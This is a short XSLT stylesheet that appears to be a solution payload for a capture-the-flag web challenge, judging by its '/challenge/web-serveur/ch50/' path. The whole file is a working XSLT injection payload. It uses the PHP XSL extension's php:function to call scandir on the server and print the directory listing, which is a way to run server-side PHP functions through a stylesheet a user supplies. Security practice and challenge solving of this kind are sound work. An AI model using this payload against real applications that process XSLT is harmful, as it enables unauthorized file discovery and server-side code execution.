<xsl:stylesheet version="1.0" 
	xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
	xmlns:php="http://php.net/xsl">
	
	<xsl:output method="html"/>
	<xsl:template match="/">
		<xsl:variable name="vPerms" select="php:function('scandir','/challenge/web-serveur/ch50/')" />
		<xsl:value-of select="$vPerms[0]" />
	</xsl:template>
</xsl:stylesheet>
